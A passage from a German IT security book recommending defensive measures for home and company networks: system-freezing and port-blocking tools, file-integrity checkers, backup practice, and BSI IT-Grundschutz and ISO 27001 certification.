allerdings nur, wenn man die Messlatte hoch anlegt. Dass jemand, der programmiert und fundierte Systemkenntnisse hat, das Produkt in zwei Minuten abschaltet, sagt noch nichts \u00fcber die generelle Tauglichkeit des Produkts aus. Viele Kids bei\u00dfen sich an dem Programm die Z\u00e4hne aus. Nichtsdestotrotz bleibt das Thema Aufkl\u00e4rung und Know-how-Transfer in Multi-User-Umgebungen aktuell. Einen komplett anderen Ansatz verfolgt Deep Freeze273, das es sowohl f\u00fcr einzelne Workstations (ab 32,95 \u20ac) als auch in der Enterprise Edition f\u00fcr gr\u00f6\u00dfere Firmennetze gibt. Was leistet dieses Tool, das weltweit \u00fcber 5 Millionen Mal im Einsatz ist? Gehen wir wieder von unserem Ursprungsszenario aus: Es werden unerw\u00fcnschte Programme geladen; die Registry wird ver\u00e4ndert, wichtige Systemkomponenten werden gekillt; der Sch\u00e4dling blockiert in der Folge jeden Versuch, sich seiner zu entledigen. Im schlimmsten Fall werden Verzeichnisse und Daten gel\u00f6scht oder manipuliert. Das Resultat w\u00e4re ein unbrauchbares, verseuchtes System, das man entweder \u00fcber eine komplette Neuinstallation oder das \u00dcberspielen eines Festplattenimages wiederherstellen m\u00fcsste \u2013 nicht 272\nhttp://c-ko.blogspot.com/2006/11/kindersicherung-2006-ist-ein.html\n273\nhttp://www.faronics.com\n19.7 Risiko: Mehrbenutzer-PCs und Netzwerksharing\n571\nmit eingerechnet die Versuche, es mit Bordmitteln oder sonstigen Tools wieder instand zu setzen. Das alles k\u00f6nnte man mit Deep Freeze verhindern. Wie es der Name schon andeutet: Ein als sicher angesehener und definierter Status wird eingefroren. Das Programm wird als Kerneltreiber geladen und \u00fcberwacht alle Ver\u00e4nderungen am System. Nach jedem Neustart ist das System wieder jungfr\u00e4ulich.\nBild 19.43: Remotekonsole, um Deep Freeze \u00fcber LAN, WAN oder Internet zu konfigurieren\nDie Sicherheitsfeatures von Deep Freeze sind relativ ausgefeilt. Beispielsweise wird der Zugang \u00fcber One-Time-Passwords gesichert, es gibt Whitelists f\u00fcr zugelassene Programme, und definierte Festplattenbereiche lassen sich gezielt f\u00fcr Speicheroperationen freigeben. Das System kann allerdings nicht verhindern, dass \u00fcber USB- oder FirewirePorts Speichermedien angeschlossen und eingesetzt werden. Aber auch daf\u00fcr gibt es L\u00f6sungen, z. B. der in zahlreichen Schulen eingesetzte USB-Blocker274 oder der Safend Protector275, mit dem man alle Schnittstellen (FireWire, PCMCIA, seriell, parallel, Bluetooth, WiFi, IrDA oder Endger\u00e4te wie CD-ROM/DVD-Brenner, SD-Karten, ZIP-und Bandlaufwerke) gezielt blockieren oder f\u00fcr Endger\u00e4te mit bestimmten Seriennummern freischalten kann.\n274\nhttp://www.hdguard.com/de/hdguard/beschreibung/10-hdguard-usb-schutz.html\n275\nhttp://www.gepanet.com/safend.htm\n572\nKapitel 19 \u2013 Private Networking\nBei alldem sollte man als Profi wie als Heimanwender jedoch nie vergessen, dass alle Schutzma\u00dfnahmen relativ sind. Gerade im \u00fcberschaubaren Heimnetzwerk reichen oft Aufkl\u00e4rung in Kombination mit einem soliden Grundschutz. Wer die restlichen L\u00fccken doch noch \u00fcberbr\u00fccken will, muss einen \u00fcberproportionalen Aufwand treiben, z. B. mit 2-Faktoren-Authentifizierung und Festplattenverschl\u00fcsselung, da sich ansonsten jedes System, wie wir gezeigt haben, mit externen Bootmedien manipulieren l\u00e4sst. Aufgrund einer unfreiwilligen Erfahrung k\u00f6nnen wir noch einen Spezialtipp beisteuern. Einfach formuliert: Je sicherer Sie Ihr System machen, desto gr\u00f6\u00dfer die Gefahr, sich selbst teilweise oder zur G\u00e4nze auszusperren. Prinzipiell reicht es schon, das (falls gesetzt) Passwort zum tempor\u00e4ren Deaktivieren von Behaviour Blockern beziehungsweise Security Scannern zu vergessen. Schon l\u00e4sst Sie das Tool nach seiner Pfeife tanzen: Bestimmte Systemprogramme k\u00f6nnen nicht mehr gestartet, Autostarteintr\u00e4ge nicht mehr ge\u00e4ndert, Registry-Modifikationen nicht mehr vorgenommen werden. Man erspart sich viel \u00c4rger, wenn man sich f\u00fcr die Sicherheitseinrichtung Zeit l\u00e4sst und in regelm\u00e4\u00dfigen Abst\u00e4nden (verschl\u00fcsselte) Backups macht. Allerdings sollte man seine Backups nie dort aufbewahren, wo der Rechner steht \u2013 Brand und Diebstahl haben n\u00e4mlich auch auf Backups / Backupmedien (wie externe Festplatten) verheerenden Einfluss.\n19.8\nSchadensbegrenzung: Intrusion Detection & Prevention\nHat man ein sauberes Heimnetzwerk mit aktuellen Sicherheitsstandards, \u00fcber die Zugriffsrechte definiert und die jeweiligen Pflichten und Rechte der Netzwerkteilnehmer festgelegt sind, sollte man alles daransetzen, diesen Zustand beizubehalten. Zu diesem Zweck sollte man die im Laufe der Zeit allerdings auch unvermeidlichen Systemver\u00e4nderungen im Auge behalten. In Windows XP Professional276 gibt es hier z. B. die M\u00f6glichkeit, Sicherheitszugriffe zu protokollieren. Man erreicht das Einstellungsfenster unter Systemsteuerung / Verwaltung / Lokale Sicherheitsrichtlinien / Lokale Richtlinien / \u00dcberwachungsrichtlinien, wo Sie dann die Anmeldeversuche \u00fcberwachen k\u00f6nnen.\n276\nDer Home-Version fehlt hier die gpedit.msc \u2013 der Gruppenrichtlinieneditor. Er l\u00e4sst sich allerdings auf eigenes Risiko nachr\u00fcsten: vgl. http://www.winfuture-forum.de/index.php?showtopic=35268.\n19.8 Schadensbegrenzung: Intrusion Detection & Prevention\n573\nBild 19.44: Sicherheitsrichtlinien festlegen\nDas Ergebnis findet sich dann unter Systemsteuerung / Verwaltung / Ereignisanzeige / Sicherheit.\nBild 19.45: Sicherheitsverletzungen \u00fcberwachen in der Ereignisanzeige\nDer n\u00e4chste logische Schritt ist das Protokollieren von Systemver\u00e4nderungen. F\u00fcr Privatpersonen gut geeignet ist das im Kapitel \u00bbMalware-Attacke aus dem Internet\u00ab vor-\n574\nKapitel 19 \u2013 Private Networking\ngestellte kostenlose WinCon 6277. Das Tool macht einen Schnappschuss aller Dateien auf einem ausgew\u00e4hlten Laufwerk und kann beim n\u00e4chsten Aufruf die Ver\u00e4nderungen, die seit diesem Zeitpunkt eingetreten sind, protokollieren und anzeigen. Je nach Anwenderund Surfverhalten \u00e4ndern sich die Dateien aber ziemlich rapide. Um hier die \u00dcbersicht zu bewahren, sollten m\u00f6gliche Ver\u00e4nderungen in kurzen und regelm\u00e4\u00dfigen Zeitintervallen \u00fcberpr\u00fcft werden. Wurden keine sicherheitsrelevanten Ver\u00e4nderungen festgestellt, wird dieser neue Zustand (X + n) als zuk\u00fcnftige Referenz abgespeichert. Eine andere M\u00f6glichkeit ist der Einsatz des Advanced Checksum Verifier (ACSV)278, der f\u00fcr jede (System-)Datei eine Pr\u00fcfsumme in seiner Datenbank ablegt und auch ohne Installation lauff\u00e4hig ist.\nBild 19.46: Systemintegrit\u00e4t \u00fcber Checksummen sichern\n\u00c4hnlich, vielleicht sogar etwas schneller und noch dazu kostenlos, arbeitet FileCheckMD5 beziehungsweise dessen Nachfolger ExactFile. F\u00fcr den Check des Windows-Verzeichnisses mit ca. 3,5 GB Daten muss man etwa mit 10 Minuten Zeitaufwand rechnen. F\u00fcr einen Statuscheck kann man das eventuell kompromittierte System mit einer Boot-CD starten, auf der sich der Filechecker befindet. So eine Pr\u00fcfung empfiehlt sich dann, wenn man die Anwesenheit eines Rootkits vermutet. Wer mehr Wert auf Komfort legt, dem k\u00f6nnen wir noch den (kostenlosen) Sentinel280 empfehlen. Das Tool l\u00e4sst sich in bestehende Antivirensoftware integrieren und \u00fcberwacht neben der Registry auch andere kritische Systemdateien und Ordner.\n277\nDie Version 7 ist leistungsf\u00e4higer, einfacher zu bedienen, aber nicht mehr kostenlos. F\u00fcr unsere Zwecke reicht die Vorg\u00e4ngerversion aus.\n278\nfunktionst\u00fcchtige Demo unter www.irnis.net/soft/acsv/\n279\nhttp://www.exactfile.com\n280\nhttp://www.runtimeware.com/sentinel.html\n19.8 Schadensbegrenzung: Intrusion Detection & Prevention\n575\nBild 19.47: Sentinel: \u00dcberwachen und Reparieren\nDer Nutzen von solchen Tools st\u00f6\u00dft dort an seine Grenzen, wo ein Sch\u00e4dling wichtige Systemdateien korrumpiert, ersetzt, \u00fcberschrieben oder sonst wie ausgetauscht hat. Einen gewissen Schutz bietet zwar auch der Windows-eigene Systemdateischutz, der mit Start / Ausf\u00fchren / cmd / sfc /scannow aktiviert wird. Aber ob die ver\u00e4nderten Dateien durch einen Sch\u00e4dling oder ein zul\u00e4ssiges Update ersetzt wurden, bekommt man damit nicht ohne Weiteres heraus. Man hat die Wahl: Entweder bleibt die Systemdatei in ihrem ver\u00e4nderten Zustand oder sie wird durch ihr \u00e4lteres Pendant ersetzt, das sich auf der Original-Installations-CD befindet und von dort zur\u00fcckgespielt wird. Sicherer ist in jedem Fall das Anlegen von Backups, auf die im Notfall (wenn unliebsame Ver\u00e4nderungen festgestellt werden) zur\u00fcckgegriffen werden kann. F\u00fcr Privatanwender etwas \u00fcberdimensioniert ist Xintegrity281, das nicht nur eine Checksumme f\u00fcr jede zu \u00fcberpr\u00fcfende Datei anlegt, sondern die Datei selbst in einer Datenbank abspeichert, wo sie im Fall der F\u00e4lle einfach restauriert werden kann. Wie auch immer, jeder f\u00fcr Sicherheitsfragen sensibilisierte PC-Nutzer sollte seine Daten in regelm\u00e4\u00dfigen Abst\u00e4nden sichern. Neben der allgemeinen Sorglosigkeit beim Surfen und Saugen f\u00e4llt uns im Bekanntenkreis immer wieder auf, dass das Thema Backup ausgesprochen unbeliebt zu sein scheint. Viele vergessen, dass es nicht nur extrem zeitaufwendig sein kann, ein aus der Not heraus \u00bbplattgemachtes\u00ab System wieder neu aufzusetzen, sondern dass von Sch\u00e4dlingen h\u00e4ufig auch Nutzdaten wie Officedateien (*.doc, *.pdf, *.ppt, *.xls etc.) oder Grafik- und Multimediadateien (Bilder, MP3s, Videos) gel\u00f6scht, verschl\u00fcsselt oder sonst 281\nhttp://www.xintegrity.com/download.html\n576\nKapitel 19 \u2013 Private Networking\nwie unbrauchbar gemacht werden \u2013 ein Schaden, der h\u00e4ufig qualitativer und nicht mehr nur quantitativer Art ist. \u00dcber Backuptechnologien und -strategien gibt es dicke B\u00fccher, deshalb zum Abschluss hier nur ein paar klassische Tipps: \u2022\nNehmen Sie ein Backupprogramm, mit dem Sie in der Praxis auch zurechtkommen. Tools, die schwierig zu konfigurieren und im Notfall auch komplex zu bedienen sind, sollten Sie au\u00dfen vor lassen. Prinzipiell empfehlenswert sind Disk-Imager, das sind Tools, mit denen sich mit einem Mausklick ein (komprimierter) Schnappschuss einer Partition bzw. einer Festplatte erstellen l\u00e4sst. Sollte dann ein Schaden eingetreten sein, kann man das Image mit einem weiteren Mausklick zur\u00fccksichern; man kann aber auch aus dem Image einzelne Dateien extrahieren. Unser Favorit ist nach wie vor das Tool Drivesnapshot von Tom Ehlert, da sich mit diesem Werkzeug auch komplett verschl\u00fcsselte Partitionen sichern und zur\u00fcckschreiben lassen.\n\u2022\nAnwenderbezogene Daten wie MP3s, Textdateien, Videos etc. kann man auch direkt auf eine (wiederbeschreibbare) DVD sichern.\n\u2022\nF\u00fcr Anwender mit kleinen Heimnetzen ist eine externe Festplatte (USB oder Firewire) als Speichermedium die erste Wahl. Es ist von den Speicherkosten g\u00fcnstiger als ein Streamer, wesentlich einfacher zu bedienen und vor allem sehr viel schneller. Allerdings sollten Sie darauf achten, dass im laufenden Betrieb die Backupplatte abgeklemmt ist. Es ist \u00e4u\u00dferst unwahrscheinlich, kann aber vorkommen, dass ein Sch\u00e4dling sich konsequent \u00fcber Festplattengrenzen und auch \u00fcbers Netzwerk hinweg ausbreitet. Und da wir gerade dabei sind: Eine weitere Sicherung Ihrer Daten sollte physisch getrennt vom PC-Arbeitsplatz aufbewahrt werden \u2013 den weiteren unwahrscheinlichen Fall angenommen, dass Einbruch, Vandalismus oder Feuer die PCs samt Backupmedien in Mitleidenschaft ziehen (idealerweise versch\u00fcsselt).\n\u2022\nMachen Sie einen Probelauf \u2013 es ist kein gutes Gef\u00fchl, sich im Ernstfall zum ersten Mal mit der Restore-Funktion auseinandersetzen zu m\u00fcssen, um dann vielleicht festzustellen, dass ein vorheriger Bedienfehler das Backup zunichte gemacht hat.\n577\n20 Company Networking Ein Blick auf die vom Bundesamt f\u00fcr Sicherheit in der Informationstechnik (BSI)282 seit etwa 15 Jahren herausgegebenen und mittlerweile viertausend Seiten umfassenden ITGrundschutz-Kataloge hei\u00dft, macht klar, dass ein grunds\u00e4tzlicher Unterschied zwischen Heim- und Unternehmensnetzwerken besteht. So empfiehlt beispielsweise der Bundesbeauftragte f\u00fcr den Datenschutz den IT-Grundschutz als Methode zur Erstellung von Sicherheitskonzepten. Bei den IT-GrundschutzKatalogen handelt es sich um ein umfassendes Werkzeug zur Entwicklung eines Managementsystems f\u00fcr Informationssicherheit. Die IT-Grundschutz-Kataloge haben sich mit ihren Definitionen von Sicherheitsrichtlinien \u2013 gerade im deutschsprachigen Raum \u2013 als Standardwerk zur IT-Sicherheit durchgesetzt mit dem Ziel, einen reibungslosen Gesch\u00e4ftsbetrieb zu erm\u00f6glichen. Unternehmen aller Gr\u00f6\u00dfenordnungen verwenden die IT-Grundschutz-Kataloge als Hilfsmittel bei der Konzeption, Realisierung und Revision von Standardsicherheitsma\u00dfnahmen. Detailliert beschreiben die IT-Grundschutz-Kataloge eine systematische Methodik zur Erarbeitung von IT-Sicherheitskonzepten auf Grundlage praxiserprobter Standardsicherheitsma\u00dfnahmen. Diese umfasst Empfehlungen f\u00fcr typische IT-Systeme mit normalem Schutzbedarf, eine Darstellung der pauschal angenommenen Gef\u00e4hrdungslage, ausf\u00fchrliche Ma\u00dfnahmenbeschreibungen als Umsetzungshilfe, eine Beschreibung des Prozesses zum Erreichen und Aufrechterhalten eines angemessenen IT-Sicherheitsniveaus sowie eine einfache Verfahrensweise zur Ermittlung des erreichten IT-Sicherheitsniveaus in Form eines Soll-Ist-Vergleichs. Einen unterhaltsamen Einstieg in den ITGrundschutz bietet der Webkurs \u00bbIT-Grundschutz283\u00ab auf der Website des BSI:\n282\nhttp://www.bsi.de/\n283\nhttps://www.bsi.bund.de/DE/Themen/weitereThemen/ITGrundschutzSchulung/SchulungdesBSI/ schulungdesbsi_node.html\n578\nKapitel 20 \u2013 Company Networking\nBild 20.1: Webkurs IT-Grundschutz\nNach erfolgreicher Umsetzung der BSI-Standards284 und aller relevanten IT-Grundschutz-Ma\u00dfnahmen kann ein Unternehmen mit einem Zertifikat nach ISO 27001 auf der Basis von IT-Grundschutz die Bem\u00fchungen um IT-Sicherheit nach au\u00dfen transparent machen. Das Zertifikat garantiert durch geeignete Anwendung von organisatorischen, personellen, infrastrukturellen und technischen Standardsicherheitsma\u00dfnahmen ein Sicherheitsniveau, das f\u00fcr den normalen Schutzbedarf angemessen und ausreichend ist, um gesch\u00e4ftsrelevante Informationen zu sch\u00fctzen. Dar\u00fcber hinaus bilden die Ma\u00dfnahmen der IT-Grundschutz-Kataloge nicht nur eine Basis f\u00fcr hochschutzbed\u00fcrftige IT-Systeme und Anwendungen, sondern liefern an vielen Stellen bereits h\u00f6herwertige Sicherheit. Voraussetzung f\u00fcr die Vergabe eines ISO 27001-Zertifikats auf der Basis von ITGrundschutz oder eines Auditor-Testats ist eine \u00dcberpr\u00fcfung durch einen vom BSI zertifizierten ISO-27001-Grundschutz-Auditor. Zu den Aufgaben eines ISO-27001Grundschutz-Auditors geh\u00f6ren eine Sichtung der von der Institution erstellten Referenzdokumente, die Durchf\u00fchrung einer Vor-Ort-Pr\u00fcfung und die Erstellung eines Auditreports. F\u00fcr die Vergabe eines ISO-27001-Zertifikats muss dieser Auditreport zur \u00dcberpr\u00fcfung dem BSI vorgelegt werden. Auf der Grundlage des Auditreports und des\n284\nhttps://www.bsi.bund.de/cln_183/DE/Themen/ITGrundschutz/ITGrundschutzStandards/ ITGrundschutzStandards_node.html\nKapitel 20: Company Networking\n579\nISO-27001-Grundschutz-Zertifizierungsschemas285 wird seitens der BSI entschieden, ob ein Zertifikat ausgestellt werden kann oder nicht. Ein Zertifikat ist drei Jahre g\u00fcltig, wobei von einem Auditor j\u00e4hrliche \u00dcberwachungsaudits des zertifizierten Untersuchungsgegenstands durchzuf\u00fchren sind. Vor Ablauf der G\u00fcltigkeit des Zertifikats kann ein Re-Zertifizierungsverfahren angestrebt werden. Weiterhin bietet das BSI auch eine Toolunterst\u00fctzung f\u00fcr IT-Grundschutz an, genauer gesagt das GSTOOL286, welches jedoch mit dem Open-Source-ISMS-Tool verinice287 einen ernsthaften Konkurrenten erhalten hat.\nBild 20.2: GSTOOL f\u00fcr das Management von Sicherheitskonzepten\nAuch nur ann\u00e4hernd die wichtigsten Aspekte zur Vorbeugung m\u00f6glicher Risiken, denen ein Unternehmensnetzwerk ausgesetzt ist, hier abhandeln zu wollen, w\u00e4re vermessen und w\u00fcrde den Rahmen unseres Buchs deutlich sprengen. Stattdessen m\u00f6chten wir exemplarische Tipps und generische Ma\u00dfnahmen aus unserer Praxis vorstellen in der Hoffnung, Sie als IT-Verantwortlichen/IT-Sicherheitsbeauftragten eines kleineren oder mittleren Unternehmens f\u00fcr einige sinnvolle Grundschutzma\u00dfnahmen motivieren zu k\u00f6nnen.\n285\nhttps://www.bsi.bund.de/cae/servlet/contentblob/478206/publicationFile/31003/Pruefschema_ V_2_1_pdf.pdf\n286\nhttps://www.bsi.bund.de/cln_183/DE/Themen/weitereThemen/GSTOOL/gstool_node.html\n287\nhttp://www.verinice.org/\n580\nKapitel 20 \u2013 Company Networking\nIm Gegensatz zu Privatanwendern gibt es f\u00fcr Firmen eine ganze Reihe von Vorschriften, Richtlinien und Gesetzen zum Thema Informationssicherheit zu beachten: \u2022\nBundesdatenschutzgesetz (BDSG)\n\u2022\nBASEL II\n\u2022\nMindestanforderungen an das Risikomanagement (MaRisk)\n\u2022\nGesetz zur Kontrolle und Transparenz im Unternehmensbereich (KonTraG)\n\u2022\nSicherheitspr\u00fcfung nach IDW PS 330\nBereits zum dritten Mal ver\u00f6ffentlichte das BSI seinen Lagebericht zur IT-Sicherheit in Deutschland288. Im Jahr 2009, so das Fazit, sei eine fortschreitende Internetkriminalit\u00e4t zu verzeichnen gewesen. Insgesamt 20 Prozent der Unternehmen planen, gezielte Anstrengungen zur Verbesserung des Sicherheitsmanagements zu unternehmen. Begleitend dazu w\u00e4chst der Markt f\u00fcr Security-L\u00f6sungen um 12,7 Prozent (Zeitraum 2006 \u2013 2009). Auf der anderen Seite stimmt bedenklich, dass \u00fcber drei Viertel der im Jahr 2008 neu entdeckten Schwachstellen auch ein Jahr sp\u00e4ter noch von einem entfernten Angreifer ausgenutzt werden k\u00f6nnen; \u00bbf\u00fcr rund die H\u00e4lfte der neu gemeldeten Schwachstellen wurde von den Herstellern der Produkte kein Update zur Behebung des Sicherheitsproblems bereitgestellt\u00ab (S. 19). H\u00e4ufiger sind es auch punktuelle Verletzungen von Sicherheitsstandards und -regeln, die gravierende Risiken f\u00fcr ein Unternehmen bergen k\u00f6nnen. Miterlebt und gesehen: \u2022\nLogin-Daten eines Abteilungsnotebooks, welches sich mehrere Mitarbeiter teilen, als Notiz auf der Innenseite des Notebooks.\n\u2022\nnicht lizenzierte Softwarekopien auf einzelnen Arbeitsplatzrechnern.\n\u2022\nDatensicherungen, die sich beim Schadensfall als wertlos erwiesen haben.\n\u2022\nKomplette MP3- & Warez-Sammlungen auf Firmenservern.\n\u2022\nEinsatz von ungesch\u00fctzten VoIP-Systemen in Forschungsabteilungen.\n\u2022\nStrategiepapiere in unzureichend gesch\u00fctzten Verzeichnissen.\n\u2022\nDeaktivierte optische Laufwerke, aber frei zug\u00e4ngliche USB-Ports in etlichen Workstations.\n\u2022\nIT-Mitarbeiter, die das Surfverhalten von F\u00fchrungskr\u00e4ften (Pornoseiten) klammheimlich (und zu ihrem Vergn\u00fcgen) ausspionieren.\nUnd das ist nur ein kleiner Ausschnitt aus dem allt\u00e4glichen Risikoszenario. Der wichtigste Schritt besteht jetzt nicht darin, in die Tool-Ecke zu greifen, sondern in einer systematischen, ineinander \u00fcbergreifenden Herangehensweise nebst Risikobewertung und Eintrittswahrscheinlichkeit.\n288\nhttps://www.bsi.bund.de/DE/Publikationen/Lageberichte/lageberichte_node.html\nKapitel 20: Company Networking\n581\nHilfreich daf\u00fcr ist z. B. der vom BSI ebenfalls ver\u00f6ffentlichte Leitfaden \u00bbInformationssicherheit \u2013 IT-Grundschutz kompakt\u00ab289, der wesentlich schlanker gehalten ist als die m\u00e4chtigen IT-Grundschutz-Kataloge und einen ersten Schritt zur Sicherheit und Zuverl\u00e4ssigkeit von Informations- und Kommunikationstechnik darstellt \u2013 auch ohne gro\u00dfe IT-Budgets. Aufgef\u00fchrte Schadensf\u00e4lle zur Sensibilisierung, Sicherheitsma\u00dfnahmen und Checklisten erleichtern den systematischen Einstieg in das Thema Informationssicherheit, welches nur bedingt aus technischen Aspekten besteht. F\u00fcr kleinere und mittlere Unternehmen bietet das Microsoft Security Assessment Tool (MSAT) eine zus\u00e4tzliche Orientierung. MSAT wertet dabei Informationen aus, die einem mehrstufigen Befragungsprozess erhoben werden.\nBild 20.3: Security Assessment von Microsoft\nDer Zeitaufwand ist gering: Um alle Fragen zu beantworten, braucht man ungef\u00e4hr eine Stunde Zeit. Allerdings sollte, um eine vern\u00fcnftige und brauchbare Aussage zu erhalten, dieses Assessment nur von qualifiziertem Personal durchgef\u00fchrt werden. Als Resultat erh\u00e4lt man einen Bericht mit Anhaltspunkten, in welchen Bereichen das Verh\u00e4ltnis von Risiken zu getroffenen Sicherheitsma\u00dfnahmen disproportional ist bzw. in welchem Reifegrad sich die eigene IT-Sicherheit befindet.\n289\nhttps://www.bsi.bund.de/cae/servlet/contentblob/540280/publicationFile/34662/GS-Leitfaden_pdf.pdf\n582\nKapitel 20 \u2013 Company Networking\nBild 20.4: Auswertung MSAT\nWir m\u00f6chten zudem auf zahlreiche Kampagnen zur Informationssicherheit hinweisen, beispielsweise die Initiative Deutschland sicher im Netz e. V.290 unter der Schirmherrschaft des BMI291, die ein erfrischendes Potpourri an Tipps und Checklisten bis hin zu Fachveranstaltungen zu sicherheitsrelevanten Bereichen anbietet.\n20.1\nBasiselemente zur Unternehmenssicherheit\nIm Gegensatz zur soeben dargestellten prophylaktischen Verfahrensweise im Home Office sind in Unternehmen sehr viel weitl\u00e4ufigere Herausforderungen im Rahmen der Informationssicherheit zu bew\u00e4ltigen. Auf die konkrete Vorstellung von Tools und Einstellungen zur Schaffung eines h\u00f6heren Sicherheitsniveaus wird daher in diesem Kapitel g\u00e4nzlich verzichtet, da das \u00d6kosystem \u00bbUnternehmen\u00ab im Regelfall zu heterogen ist, als dass \u2013 zumindest in einem vertretbaren Umfang \u2013 konkrete Tipps zu einzelnen Systemen gegeben werden k\u00f6nnten: Denn neben Windows- und UNIX/Linux-Systemen sind \u00fcblicherweise eine Vielzahl weiterer, oftmals sehr komplexer Technologien im Einsatz, die eine Grundlage f\u00fcr zahlreiche Gesch\u00e4ftsprozesse in Unternehmen liefern. So treffen beispielsweise Router, Switches, Firewalls, Mailserver, TK-Anlagen, SAN, Virtualisierung und Funktechniken aufeinander und bed\u00fcrfen einer ganzheitlichen Betrachtung. Im Folgenden wird daher ausschlie\u00dflich auf ausgew\u00e4hlte und nach Ansicht der Autoren auf fundamental bedeutsame, generische Sicherheitsma\u00dfnahmen Bezug genommen, die\n290\nhttps://www.sicher-im-netz.de/Default.aspx\n291\nhttp://www.bmi.bund.de/cln_174/DE/Home/startseite_node.html\n20.2 Teilbereich Infrastruktur und Organisation\n583\nwiederum in den IT-Grundschutz-Katalogen des BSI detailliert dargestellt werden. Es handelt sich dabei um ausgesuchte organisatorische, personelle, infrastrukturelle und technische Standardsicherheitsma\u00dfnahmen, deren Umsetzung ein angemessenes Sicherheitsniveau schafft, das f\u00fcr den normalen Schutzbedarf angemessen und ausreichend ist, um gesch\u00e4ftsrelevante Informationen zu sch\u00fctzen. Zudem handelt es sich im Wesentlichen um diejenigen Sicherheitsma\u00dfnahmen, die einem Angreifer der in diesem Buch bereits dargestellten Angriffe das Wasser abgegraben und die Aussicht auf einen Erfolg bereits im Vorfeld ad absurdum gef\u00fchrt h\u00e4tten.\n20.2\nTeilbereich Infrastruktur und Organisation\nGeschlossene Fenster und T\u00fcren Unverschlossene Fenster und T\u00fcren bieten Unbefugten oftmals Gelegenheit, \u00bbkurz mal vorbeizusehen\u00ab und Ger\u00e4tschaften zu entwenden \u2013 oder aber Ger\u00e4tschaften hinzuzuf\u00fcgen (beispielsweise unerw\u00fcnschte und heimlich angebrachte Access-Points f\u00fcr WLAN). Fenster, nach au\u00dfen gehende T\u00fcren sowie T\u00fcren zu schutzbed\u00fcrftigen R\u00e4umlichkeiten wie beispielsweise einem Serverraum oder R\u00e4umen mit Netzwerkdosen sind somit in Zeiten, zu denen ein Raum nicht besetzt ist, unbedingt zu verschlie\u00dfen. IT-Sicherheitsleitlinie Bevor sich ein Unternehmen ernsthaft mit Informationssicherheit besch\u00e4ftigt, bedarf es der Erstellung einer IT-Sicherheitsleitlinie. Eine IT-Sicherheitsleitlinie umfasst \u00fcblicherweise die Leitaussagen zur IT-Sicherheitsstrategie und ist mit einer Charta gleichzusetzen, in der das Unternehmen die angestrebten Ziele im Bereich der Informationssicherheit definiert und sich dazu bekennt. Die IT-Sicherheitsleitlinie sollte somit u. a. Aussagen zum angestrebten Sicherheitsniveau, den IT-Sicherheitszielen, der IT-Sicherheitsstrategie und der Verantwortung der Gesch\u00e4ftsleitung enthalten. Zudem sollten eine Verpflichtung zur st\u00e4ndigen Weiterentwicklung und die Verantwortlichkeiten zur Pflege und Aktualisierung enthalten sein. IT-Sicherheitsstrategie Bei der Festlegung der IT-Sicherheitsstrategie geht es im Wesentlichen darum, die essentiellen Gesch\u00e4ftsprozesse und Informationen des Unternehmens zu definieren. Hieraus l\u00e4sst sich ermitteln, welchen Schutzbedarf die einzelnen IT-Anwendungen, ITKomponenten und Netze haben und welche konkreten Sicherheitsma\u00dfnahmen \u2013 z. B. f\u00fcr den Mailserver oder die zentrale Netzwerk-Core \u2013 dann anschlie\u00dfend umzusetzen sind. Organisationsstruktur Zur fest definierten Einbindung der IT-Sicherheit in das Unternehmen bedarf es einer geeigneten, \u00fcbergreifenden IT-Sicherheitsorganisation. Dazu geh\u00f6rt beispielsweise die Ernennung eines IT-Sicherheitsbeauftragten, der f\u00fcr alle IT-Sicherheitsbelange und deren Umsetzung zust\u00e4ndig ist. Hierbei sollte die Gesamtverantwortung f\u00fcr den ITSicherheitsprozess von der Gesch\u00e4ftsf\u00fchrung \u00fcbernommen werden, um eine dauerhafte\n584\nKapitel 20 \u2013 Company Networking\nUnterst\u00fctzung des IT-Sicherheitsprozesses durch personelle und materielle Ressourcen zu gew\u00e4hrleisten. \u00dcbersicht \u00fcber IT-Systeme und die Erstellung eines Netzwerkplans Ohne einen \u00dcberblick dar\u00fcber zu haben, welche IT-Ger\u00e4tschaften im Unternehmensnetz ihren Dienst verrichten, f\u00e4llt es schwer, geeignete Ma\u00dfnahmen einzuleiten. Wir empfehlen somit die Erstellung einer \u00dcbersicht s\u00e4mtlicher IT-Systeme inklusive Rechner, Server und Netzwerkkomponenten. Zus\u00e4tzlich wird ein Netzwerkplan ben\u00f6tigt. Die Pflege der Materialien sollte dem IT-Sicherheitsbeauftragten unterstehen. IT-Sicherheitskonzept Die Erstellung eines IT-Sicherheitskonzepts als \u00bbzentrales\u00ab Dokument im IT-Sicherheitsprozess, auf das sich jede konkrete Ma\u00dfnahme zur Umsetzung der IT-Sicherheitsstrategie zur\u00fcckf\u00fchren l\u00e4sst, ist Voraussetzung f\u00fcr das Erreichen der Sicherheitsziele. Das IT-Sicherheitskonzept beschreibt u. a. die geplante Vorgehensweise, um die gesetzten Sicherheitsziele des Unternehmens zu erreichen, und besteht \u00fcblicherweise aus einer Vielzahl untergeordneter Dokumente. Integration der Mitarbeiter Da die Entwicklung der Informationssicherheit das gesamte Unternehmen betrifft, ist die Einbindung der Mitarbeiter in den Sicherheitsprozess von zentraler Bedeutung. Wir empfehlen die Integration und Sensibilisierung der Mitarbeiter f\u00fcr IT-Sicherheit u. a. durch verst\u00e4ndliche Sicherheitsrichtlinien (z. B. die Richtlinie zur Verwendung von Passw\u00f6rtern), regelm\u00e4\u00dfige Mitarbeiterschulungen, stetige Ansprechbarkeit des ITSicherheitsbeauftragten und angek\u00fcndigte Security-Scans auf Rechnern. Wartungs- und Reparaturarbeiten Gerade Wartungs- und Reparaturarbeiten stellen ein nicht unerhebliches Problem in einem Unternehmen dar, da diese oftmals verbunden sind mit dem Besuch eines externen Dienstleisters. Kommt es h\u00e4ufiger zu Wartungsarbeiten, gew\u00f6hnen sich Mitarbeiter an den Zustand und neigen gegebenenfalls zur Leichtgl\u00e4ubigkeit, sodass sich auch Fremde \u2013 Unbekannte, die keinerlei Befugnis haben und nur vorgeben, ein Wartungstechniker zu sein \u2013 Zugang zum Geb\u00e4ude verschaffen k\u00f6nnen. Wartungs- und Reparaturarbeiten sollten den betroffenen Mitarbeitern somit gegen\u00fcber angek\u00fcndigt werden. Hierbei bietet es sich grunds\u00e4tzlich an, jegliche Wartungs- und Reparaturarbeit bereits im Vorfeld zu kommunizieren, beispielsweise in Form eines Wartungsplans. So lassen sich die T\u00e4tigkeiten nicht nur besser planen und nachhalten, sondern auch Eindringlinge fr\u00fchestm\u00f6glich enttarnen. Zutrittsberechtigungen Wir empfehlen, die R\u00e4ume des Unternehmens hinsichtlich der Schutzbed\u00fcrftigkeit zu bestimmen. Danach ist zu 